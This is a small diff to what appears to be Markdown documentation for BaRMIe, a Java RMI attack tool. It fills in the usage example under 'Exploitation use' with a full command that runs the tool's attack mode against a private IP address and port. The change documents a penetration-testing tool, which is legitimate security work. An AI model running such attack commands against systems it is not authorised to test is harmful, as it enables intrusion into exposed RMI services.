@@ -120,6 +120,6 @@ Successfully scanned 1 target(s) for objects exposed via RMI.
 Exploitation use 
 
 ```text
-BaRMIe -attack
+java -jar BaRMIe_v1.01.jar -attack 172.16.11.18 1100
 ```
 
